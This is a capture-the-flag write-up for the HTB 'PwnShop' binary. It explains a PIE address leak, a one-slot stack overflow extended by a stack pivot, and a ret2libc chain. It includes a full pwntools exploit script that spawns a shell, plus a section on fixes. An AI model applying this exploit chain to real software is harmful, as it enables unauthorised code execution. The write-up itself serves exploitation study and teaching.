## Overview

**PwnShop** is an Easy HTB Pwn challenge. A 64-bit PIE binary simulates a pawn shop: two menu actions — `sell()` leaks the PIE base via an adjacent-variable `printf`, and `buy()` has a [stack-based buffer overflow](https://cwe.mitre.org/data/definitions/121.html) that allows only one gadget slot. That single slot lands a stack pivot (`sub rsp,0x28; ret`) that shifts the stack pointer backward into the already-written input buffer, expanding the usable ROP surface to 32 bytes — enough for a full three-stage `ret2libc` chain.

---

## The Technique

### Stage 1 — PIE base disclosure via adjacent-variable printf

`sell()` stores three things on its stack frame: a 32-byte item name buffer at `rsp+0x00`, an 8-byte price buffer at `rsp+0x20`, and a PIE pointer to BSS (`0x40c0`) at `rsp+0x28`. The price is read with `read(0, rsp+0x20, 8)` — no null terminator added — then passed straight to `printf("What? %s?…", rsp+0x20)`.

Filling all 8 price bytes with non-null characters causes `printf` to walk past the price buffer into the adjacent PIE pointer, printing its 6-byte value as part of the rejection string: `"What? BBBBBBBB<6-byte-PIE>? The best I can do is 13.37$"`. Strip the known prefix, unpack the bytes, and subtract the BSS offset to recover `pie_base`.

### Stage 2 — Stack pivot expands a 1-slot overflow into a ROP chain

`buy()` allocates `sub $0x48,%rsp` (72 bytes) but reads `read(0, rsp, 0x50)` (80 bytes) — an 8-byte overflow, exactly one gadget slot past the buffer. With PIE + NX but no stack canary, the overflow is enough for one return address.

The pivot gadget at `pie_base+0x1219` (`sub rsp,0x28; ret`) is chosen as that sole address. After `buy()`'s epilogue fires it:

1. `sub rsp,0x28` shifts `rsp` backward 40 bytes, landing it at `buf[0x50 - 0x28] = buf[40]`.
2. `ret` then reads the next return address from `buf[40]` — attacker-controlled data already in the buffer.

This gives 32 bytes of ROP chain space (`buf[40:72]`), enough for four 8-byte gadgets: `pop rdi; ret → setvbuf@GOT → puts@plt → main`. `puts` prints the libc address of `setvbuf`; `main` re-prints the banner, anchoring the parse: read everything before `"\n========= HTB PwnShop ==========="`.

Libc identification: `setvbuf & 0xfff == 0xe80` → Ubuntu 16.04 glibc 2.23 (setvbuf=`0x6fe80`, system=`0x453a0`, `/bin/sh`=`0x18ce17`).

### Stage 3 — ret2libc

The same pivot is used a third time. ROP at `buf[40:]`: `pop rdi; ret → /bin/sh → system`. No alignment `ret` gadget is needed — RSP at `system()` entry is naturally `8 mod 16` given this specific call stack, satisfying the x86-64 ABI requirement.

## Solution

`solve.py` (pwntools):

```python
#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'

PIVOT        = 0x1219
POP_RDI      = 0x13c3
PUTS_PLT     = 0x1030
SETVBUF_GOT  = 0x4048
MAIN         = 0x10a0
BSS_PTR_OFF  = 0x40c0
SETVBUF_OFF  = 0x6fe80
SYSTEM_OFF   = 0x453a0
BINSH_OFF    = 0x18ce17

io = remote('TARGET_IP', TARGET_PORT)

def wait_menu():
    io.recvuntil(b'3> Exit\n')

# Stage 1: PIE leak
wait_menu()
io.sendline(b'2')
io.recvuntil(b'What do you wish to sell? ')
io.send(b'X' * 8)
io.recvuntil(b'How much do you want for it? ')
io.send(b'B' * 8)
raw      = io.recvuntil(b'? The best I can do is 13.37$')
pie_part  = raw[14:]
pie_bytes = pie_part[:pie_part.index(b'? The')]
pie_base  = u64(pie_bytes.ljust(8, b'\x00')) - BSS_PTR_OFF

pivot_addr   = pie_base + PIVOT
pop_rdi_addr = pie_base + POP_RDI
puts_plt     = pie_base + PUTS_PLT
setvbuf_got  = pie_base + SETVBUF_GOT
main_addr    = pie_base + MAIN

# Stage 2: libc leak
wait_menu()
io.sendline(b'1')
io.recvuntil(b'Enter details: ')
rop2 = flat(pop_rdi_addr, setvbuf_got, puts_plt, main_addr)
payload2 = b'A' * 40 + rop2 + b'B' * (72 - 40 - len(rop2)) + p64(pivot_addr)
io.send(payload2)
data2        = io.recvuntil(b'========= HTB PwnShop ===========')
libc_setvbuf = u64(data2[:data2.index(b'\n========= HTB PwnShop')].ljust(8, b'\x00'))
libc_base    = libc_setvbuf - SETVBUF_OFF
system_ptr   = libc_base + SYSTEM_OFF
binsh_ptr    = libc_base + BINSH_OFF

# Stage 3: ret2libc
wait_menu()
io.sendline(b'1')
io.recvuntil(b'Enter details: ')
rop3 = flat(pop_rdi_addr, binsh_ptr, system_ptr)
payload3 = b'A' * 40 + rop3 + b'C' * (72 - 40 - len(rop3)) + p64(pivot_addr)
io.send(payload3)
io.interactive()
```

## Why it worked

`buy()` is missing a bounds check: `read(0, buf, 0x50)` reads 8 more bytes than the 72-byte frame allocation. With PIE and NX enabled but no stack canary, those 8 bytes are silently written past the buffer directly over the return address. The `sell()` information leak is a separate [missing null terminator](https://cwe.mitre.org/data/definitions/170.html) bug: `printf` is given a stack pointer that runs past the price buffer into an adjacent slot holding a PIE address, leaking the binary's load offset before a single byte of overflow is needed.

The pivot technique is what makes a 1-slot overflow exploitable: instead of needing enough overflow space for a full ROP chain, a single `sub rsp,N; ret` gadget moves the stack pointer backward into the attacker-controlled input that was already written, recycling the input buffer as ROP chain storage.

---

## Fix

```c
void buy(void) {
    char buf[72];
    read(0, buf, sizeof(buf));   // bound to exact allocation
}
```

Compile with `-fstack-protector-strong` so a stack canary terminates any future over-read before it reaches the saved return address. The PIE leak is fixed by ensuring the price buffer is null-terminated before `printf` walks past it: `buf[7] = '\0'` after the `read()` call, or use `printf` with a width specifier (`"%.8s"`) to prevent the walk.
